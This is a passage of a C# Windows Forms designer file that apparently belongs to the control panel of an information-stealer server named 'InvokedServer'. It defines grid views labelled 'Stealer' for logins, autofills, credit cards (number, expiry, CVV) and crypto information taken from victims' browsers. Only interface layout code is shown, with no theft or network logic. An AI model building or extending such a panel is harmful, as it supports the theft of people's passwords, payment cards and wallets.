            this.LoginsPage.StateCommon.Page.Color1 = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.LoginsPage.Text = "Logins";
            this.LoginsPage.ToolTipTitle = "Page ToolTip";
            this.LoginsPage.UniqueName = "2044B70531E943014AB9C1CDDFBFA642";
            // 
            // StealerLoginsDataGridView
            // 
            this.StealerLoginsDataGridView.AllowUserToAddRows = false;
            this.StealerLoginsDataGridView.AllowUserToDeleteRows = false;
            this.StealerLoginsDataGridView.AllowUserToOrderColumns = true;
            this.StealerLoginsDataGridView.AllowUserToResizeColumns = false;
            this.StealerLoginsDataGridView.AllowUserToResizeRows = false;
            dataGridViewCellStyle13.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            dataGridViewCellStyle13.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle13.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(90)))), ((int)(((byte)(92)))), ((int)(((byte)(120)))));
            dataGridViewCellStyle13.SelectionForeColor = System.Drawing.Color.White;
            this.StealerLoginsDataGridView.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle13;
            this.StealerLoginsDataGridView.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
            this.StealerLoginsDataGridView.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerLoginsDataGridView.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle14.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle14.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle14.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle14.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle14.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle14.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
            dataGridViewCellStyle14.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.StealerLoginsDataGridView.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle14;
            this.StealerLoginsDataGridView.ColumnHeadersHeight = 20;
            this.StealerLoginsDataGridView.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.dataGridViewTextBoxColumn2,
            this.dataGridViewTextBoxColumn3,
            this.dataGridViewTextBoxColumn5,
            this.dataGridViewTextBoxColumn14,
            this.dataGridViewTextBoxColumn15});
            dataGridViewCellStyle15.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle15.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            dataGridViewCellStyle15.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle15.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle15.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(90)))), ((int)(((byte)(92)))), ((int)(((byte)(120)))));
            dataGridViewCellStyle15.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle15.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.StealerLoginsDataGridView.DefaultCellStyle = dataGridViewCellStyle15;
            this.StealerLoginsDataGridView.Dock = System.Windows.Forms.DockStyle.Fill;
            this.StealerLoginsDataGridView.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
            this.StealerLoginsDataGridView.GridColor = System.Drawing.Color.Black;
            this.StealerLoginsDataGridView.Location = new System.Drawing.Point(0, 0);
            this.StealerLoginsDataGridView.Name = "StealerLoginsDataGridView";
            this.StealerLoginsDataGridView.ReadOnly = true;
            this.StealerLoginsDataGridView.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.StealerLoginsDataGridView.RowHeadersVisible = false;
            this.StealerLoginsDataGridView.RowHeadersWidthSizeMode = System.Windows.Forms.DataGridViewRowHeadersWidthSizeMode.DisableResizing;
            this.StealerLoginsDataGridView.Size = new System.Drawing.Size(877, 354);
            this.StealerLoginsDataGridView.TabIndex = 4;
            this.StealerLoginsDataGridView.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerLoginsDataGridView.ThemeStyle.AlternatingRowsStyle.Font = null;
            this.StealerLoginsDataGridView.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.White;
            this.StealerLoginsDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
            this.StealerLoginsDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
            this.StealerLoginsDataGridView.ThemeStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerLoginsDataGridView.ThemeStyle.GridColor = System.Drawing.Color.Black;
            this.StealerLoginsDataGridView.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.StealerLoginsDataGridView.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.StealerLoginsDataGridView.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.StealerLoginsDataGridView.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.White;
            this.StealerLoginsDataGridView.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
            this.StealerLoginsDataGridView.ThemeStyle.HeaderStyle.Height = 20;
            this.StealerLoginsDataGridView.ThemeStyle.ReadOnly = true;
            this.StealerLoginsDataGridView.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerLoginsDataGridView.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
            this.StealerLoginsDataGridView.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.StealerLoginsDataGridView.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.White;
            this.StealerLoginsDataGridView.ThemeStyle.RowsStyle.Height = 22;
            this.StealerLoginsDataGridView.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(231)))), ((int)(((byte)(229)))), ((int)(((byte)(255)))));
            this.StealerLoginsDataGridView.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
            // 
            // dataGridViewTextBoxColumn2
            // 
            this.dataGridViewTextBoxColumn2.FillWeight = 10.15228F;
            this.dataGridViewTextBoxColumn2.HeaderText = "Client";
            this.dataGridViewTextBoxColumn2.Name = "dataGridViewTextBoxColumn2";
            this.dataGridViewTextBoxColumn2.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn3
            // 
            this.dataGridViewTextBoxColumn3.FillWeight = 10.15228F;
            this.dataGridViewTextBoxColumn3.HeaderText = "Browser/Profile";
            this.dataGridViewTextBoxColumn3.Name = "dataGridViewTextBoxColumn3";
            this.dataGridViewTextBoxColumn3.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn5
            // 
            this.dataGridViewTextBoxColumn5.FillWeight = 25F;
            this.dataGridViewTextBoxColumn5.HeaderText = "URL";
            this.dataGridViewTextBoxColumn5.Name = "dataGridViewTextBoxColumn5";
            this.dataGridViewTextBoxColumn5.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn14
            // 
            this.dataGridViewTextBoxColumn14.FillWeight = 10.15228F;
            this.dataGridViewTextBoxColumn14.HeaderText = "Username";
            this.dataGridViewTextBoxColumn14.Name = "dataGridViewTextBoxColumn14";
            this.dataGridViewTextBoxColumn14.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn15
            // 
            this.dataGridViewTextBoxColumn15.FillWeight = 10.15228F;
            this.dataGridViewTextBoxColumn15.HeaderText = "Password";
            this.dataGridViewTextBoxColumn15.Name = "dataGridViewTextBoxColumn15";
            this.dataGridViewTextBoxColumn15.ReadOnly = true;
            // 
            // AutofillsPage
            // 
            this.AutofillsPage.AutoHiddenSlideSize = new System.Drawing.Size(200, 200);
            this.AutofillsPage.Controls.Add(this.StealerAutofillsDataGridView);
            this.AutofillsPage.Flags = 65534;
            this.AutofillsPage.ImageSmall = global::InvokedServer.Properties.Resources.ui_text_field_password;
            this.AutofillsPage.LastVisibleSet = true;
            this.AutofillsPage.MinimumSize = new System.Drawing.Size(50, 50);
            this.AutofillsPage.Name = "AutofillsPage";
            this.AutofillsPage.Size = new System.Drawing.Size(819, 95);
            this.AutofillsPage.StateCommon.Page.Color1 = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.AutofillsPage.Text = "Autofills";
            this.AutofillsPage.ToolTipTitle = "Page ToolTip";
            this.AutofillsPage.UniqueName = "5593922104DD4EE58886162425B26439";
            // 
            // StealerAutofillsDataGridView
            // 
            this.StealerAutofillsDataGridView.AllowUserToAddRows = false;
            this.StealerAutofillsDataGridView.AllowUserToDeleteRows = false;
            this.StealerAutofillsDataGridView.AllowUserToOrderColumns = true;
            this.StealerAutofillsDataGridView.AllowUserToResizeColumns = false;
            dataGridViewCellStyle16.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            dataGridViewCellStyle16.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle16.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(90)))), ((int)(((byte)(92)))), ((int)(((byte)(120)))));
            dataGridViewCellStyle16.SelectionForeColor = System.Drawing.Color.White;
            this.StealerAutofillsDataGridView.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle16;
            this.StealerAutofillsDataGridView.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
            this.StealerAutofillsDataGridView.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerAutofillsDataGridView.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle17.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle17.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle17.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle17.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle17.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle17.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
            dataGridViewCellStyle17.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.StealerAutofillsDataGridView.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle17;
            this.StealerAutofillsDataGridView.ColumnHeadersHeight = 20;
            this.StealerAutofillsDataGridView.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.dataGridViewTextBoxColumn1,
            this.Column3,
            this.Column1,
            this.Column2});
            dataGridViewCellStyle18.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle18.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            dataGridViewCellStyle18.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle18.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle18.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(90)))), ((int)(((byte)(92)))), ((int)(((byte)(120)))));
            dataGridViewCellStyle18.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle18.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.StealerAutofillsDataGridView.DefaultCellStyle = dataGridViewCellStyle18;
            this.StealerAutofillsDataGridView.Dock = System.Windows.Forms.DockStyle.Fill;
            this.StealerAutofillsDataGridView.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
            this.StealerAutofillsDataGridView.GridColor = System.Drawing.Color.Black;
            this.StealerAutofillsDataGridView.Location = new System.Drawing.Point(0, 0);
            this.StealerAutofillsDataGridView.Name = "StealerAutofillsDataGridView";
            this.StealerAutofillsDataGridView.ReadOnly = true;
            this.StealerAutofillsDataGridView.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.StealerAutofillsDataGridView.RowHeadersVisible = false;
            this.StealerAutofillsDataGridView.RowHeadersWidthSizeMode = System.Windows.Forms.DataGridViewRowHeadersWidthSizeMode.DisableResizing;
            this.StealerAutofillsDataGridView.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.CellSelect;
            this.StealerAutofillsDataGridView.Size = new System.Drawing.Size(819, 95);
            this.StealerAutofillsDataGridView.TabIndex = 3;
            this.StealerAutofillsDataGridView.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerAutofillsDataGridView.ThemeStyle.AlternatingRowsStyle.Font = null;
            this.StealerAutofillsDataGridView.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.White;
            this.StealerAutofillsDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
            this.StealerAutofillsDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
            this.StealerAutofillsDataGridView.ThemeStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerAutofillsDataGridView.ThemeStyle.GridColor = System.Drawing.Color.Black;
            this.StealerAutofillsDataGridView.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.StealerAutofillsDataGridView.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.StealerAutofillsDataGridView.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.StealerAutofillsDataGridView.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.White;
            this.StealerAutofillsDataGridView.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
            this.StealerAutofillsDataGridView.ThemeStyle.HeaderStyle.Height = 20;
            this.StealerAutofillsDataGridView.ThemeStyle.ReadOnly = true;
            this.StealerAutofillsDataGridView.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerAutofillsDataGridView.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
            this.StealerAutofillsDataGridView.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.StealerAutofillsDataGridView.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.White;
            this.StealerAutofillsDataGridView.ThemeStyle.RowsStyle.Height = 22;
            this.StealerAutofillsDataGridView.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(231)))), ((int)(((byte)(229)))), ((int)(((byte)(255)))));
            this.StealerAutofillsDataGridView.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
            // 
            // dataGridViewTextBoxColumn1
            // 
            this.dataGridViewTextBoxColumn1.FillWeight = 10.15228F;
            this.dataGridViewTextBoxColumn1.HeaderText = "Client";
            this.dataGridViewTextBoxColumn1.Name = "dataGridViewTextBoxColumn1";
            this.dataGridViewTextBoxColumn1.ReadOnly = true;
            // 
            // Column3
            // 
            this.Column3.FillWeight = 10.15228F;
            this.Column3.HeaderText = "Browser/Profile";
            this.Column3.Name = "Column3";
            this.Column3.ReadOnly = true;
            // 
            // Column1
            // 
            this.Column1.FillWeight = 10.15228F;
            this.Column1.HeaderText = "Name";
            this.Column1.Name = "Column1";
            this.Column1.ReadOnly = true;
            // 
            // Column2
            // 
            this.Column2.FillWeight = 20F;
            this.Column2.HeaderText = "Value";
            this.Column2.Name = "Column2";
            this.Column2.ReadOnly = true;
            // 
            // CardsPage
            // 
            this.CardsPage.AutoHiddenSlideSize = new System.Drawing.Size(200, 200);
            this.CardsPage.Controls.Add(this.StealerCardsDataGridView);
            this.CardsPage.Flags = 65534;
            this.CardsPage.ImageSmall = global::InvokedServer.Properties.Resources.creditcards;
            this.CardsPage.LastVisibleSet = true;
            this.CardsPage.MinimumSize = new System.Drawing.Size(50, 50);
            this.CardsPage.Name = "CardsPage";
            this.CardsPage.Size = new System.Drawing.Size(819, 95);
            this.CardsPage.StateCommon.Page.Color1 = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.CardsPage.Text = "Credit Cards";
            this.CardsPage.ToolTipTitle = "Page ToolTip";
            this.CardsPage.UniqueName = "F2632691056A40D44B92F60D06076D8B";
            // 
            // StealerCardsDataGridView
            // 
            this.StealerCardsDataGridView.AllowUserToAddRows = false;
            this.StealerCardsDataGridView.AllowUserToDeleteRows = false;
            this.StealerCardsDataGridView.AllowUserToOrderColumns = true;
            this.StealerCardsDataGridView.AllowUserToResizeColumns = false;
            this.StealerCardsDataGridView.AllowUserToResizeRows = false;
            dataGridViewCellStyle19.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            dataGridViewCellStyle19.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle19.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(90)))), ((int)(((byte)(92)))), ((int)(((byte)(120)))));
            dataGridViewCellStyle19.SelectionForeColor = System.Drawing.Color.White;
            this.StealerCardsDataGridView.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle19;
            this.StealerCardsDataGridView.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
            this.StealerCardsDataGridView.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerCardsDataGridView.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle20.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle20.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle20.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle20.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle20.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle20.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
            dataGridViewCellStyle20.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.StealerCardsDataGridView.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle20;
            this.StealerCardsDataGridView.ColumnHeadersHeight = 20;
            this.StealerCardsDataGridView.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.dataGridViewTextBoxColumn10,
            this.dataGridViewTextBoxColumn11,
            this.dataGridViewTextBoxColumn13,
            this.dataGridViewTextBoxColumn20,
            this.dataGridViewTextBoxColumn21,
            this.dataGridViewTextBoxColumn22,
            this.dataGridViewTextBoxColumn23});
            dataGridViewCellStyle21.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle21.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            dataGridViewCellStyle21.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle21.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle21.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(90)))), ((int)(((byte)(92)))), ((int)(((byte)(120)))));
            dataGridViewCellStyle21.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle21.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.StealerCardsDataGridView.DefaultCellStyle = dataGridViewCellStyle21;
            this.StealerCardsDataGridView.Dock = System.Windows.Forms.DockStyle.Fill;
            this.StealerCardsDataGridView.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
            this.StealerCardsDataGridView.GridColor = System.Drawing.Color.Black;
            this.StealerCardsDataGridView.Location = new System.Drawing.Point(0, 0);
            this.StealerCardsDataGridView.Name = "StealerCardsDataGridView";
            this.StealerCardsDataGridView.ReadOnly = true;
            this.StealerCardsDataGridView.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.StealerCardsDataGridView.RowHeadersVisible = false;
            this.StealerCardsDataGridView.RowHeadersWidthSizeMode = System.Windows.Forms.DataGridViewRowHeadersWidthSizeMode.DisableResizing;
            this.StealerCardsDataGridView.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.CellSelect;
            this.StealerCardsDataGridView.Size = new System.Drawing.Size(819, 95);
            this.StealerCardsDataGridView.TabIndex = 4;
            this.StealerCardsDataGridView.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerCardsDataGridView.ThemeStyle.AlternatingRowsStyle.Font = null;
            this.StealerCardsDataGridView.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.White;
            this.StealerCardsDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
            this.StealerCardsDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
            this.StealerCardsDataGridView.ThemeStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerCardsDataGridView.ThemeStyle.GridColor = System.Drawing.Color.Black;
            this.StealerCardsDataGridView.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.StealerCardsDataGridView.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.StealerCardsDataGridView.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.StealerCardsDataGridView.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.White;
            this.StealerCardsDataGridView.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
            this.StealerCardsDataGridView.ThemeStyle.HeaderStyle.Height = 20;
            this.StealerCardsDataGridView.ThemeStyle.ReadOnly = true;
            this.StealerCardsDataGridView.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.StealerCardsDataGridView.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
            this.StealerCardsDataGridView.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.StealerCardsDataGridView.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.White;
            this.StealerCardsDataGridView.ThemeStyle.RowsStyle.Height = 22;
            this.StealerCardsDataGridView.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(231)))), ((int)(((byte)(229)))), ((int)(((byte)(255)))));
            this.StealerCardsDataGridView.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
            // 
            // dataGridViewTextBoxColumn10
            // 
            this.dataGridViewTextBoxColumn10.FillWeight = 10.15228F;
            this.dataGridViewTextBoxColumn10.HeaderText = "Client";
            this.dataGridViewTextBoxColumn10.Name = "dataGridViewTextBoxColumn10";
            this.dataGridViewTextBoxColumn10.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn11
            // 
            this.dataGridViewTextBoxColumn11.FillWeight = 10.15228F;
            this.dataGridViewTextBoxColumn11.HeaderText = "Browser/Profile";
            this.dataGridViewTextBoxColumn11.Name = "dataGridViewTextBoxColumn11";
            this.dataGridViewTextBoxColumn11.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn13
            // 
            this.dataGridViewTextBoxColumn13.FillWeight = 10.15228F;
            this.dataGridViewTextBoxColumn13.HeaderText = "Name";
            this.dataGridViewTextBoxColumn13.Name = "dataGridViewTextBoxColumn13";
            this.dataGridViewTextBoxColumn13.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn20
            // 
            this.dataGridViewTextBoxColumn20.FillWeight = 20F;
            this.dataGridViewTextBoxColumn20.HeaderText = "Number";
            this.dataGridViewTextBoxColumn20.Name = "dataGridViewTextBoxColumn20";
            this.dataGridViewTextBoxColumn20.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn21
            // 
            this.dataGridViewTextBoxColumn21.FillWeight = 8F;
            this.dataGridViewTextBoxColumn21.HeaderText = "Month";
            this.dataGridViewTextBoxColumn21.Name = "dataGridViewTextBoxColumn21";
            this.dataGridViewTextBoxColumn21.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn22
            // 
            this.dataGridViewTextBoxColumn22.FillWeight = 8F;
            this.dataGridViewTextBoxColumn22.HeaderText = "Year";
            this.dataGridViewTextBoxColumn22.Name = "dataGridViewTextBoxColumn22";
            this.dataGridViewTextBoxColumn22.ReadOnly = true;
            // 
            // dataGridViewTextBoxColumn23
            // 
            this.dataGridViewTextBoxColumn23.FillWeight = 10.15228F;
            this.dataGridViewTextBoxColumn23.HeaderText = "CVV";
            this.dataGridViewTextBoxColumn23.Name = "dataGridViewTextBoxColumn23";
            this.dataGridViewTextBoxColumn23.ReadOnly = true;
            // 
            // CryptoinfoPage
            // 
            this.CryptoinfoPage.AutoHiddenSlideSize = new System.Drawing.Size(200, 200);
            this.CryptoinfoPage.Controls.Add(this.StealerCryptoInfoDataGridView);
            this.CryptoinfoPage.Flags = 65534;
            this.CryptoinfoPage.ImageSmall = global::InvokedServer.Properties.Resources.crypto;
            this.CryptoinfoPage.LastVisibleSet = true;
            this.CryptoinfoPage.MinimumSize = new System.Drawing.Size(50, 50);
            this.CryptoinfoPage.Name = "CryptoinfoPage";
            this.CryptoinfoPage.Size = new System.Drawing.Size(819, 95);
            this.CryptoinfoPage.StateCommon.Page.Color1 = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.CryptoinfoPage.Text = "Crypto Info";
            this.CryptoinfoPage.ToolTipTitle = "Page ToolTip";
            this.CryptoinfoPage.UniqueName = "73991975B14A4F376E8408FF87367BB3";
            // 
            // StealerCryptoInfoDataGridView
            // 
            this.StealerCryptoInfoDataGridView.AllowUserToAddRows = false;
            this.StealerCryptoInfoDataGridView.AllowUserToDeleteRows = false;
            this.StealerCryptoInfoDataGridView.AllowUserToOrderColumns = true;
            this.StealerCryptoInfoDataGridView.AllowUserToResizeColumns = false;
            dataGridViewCellStyle22.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
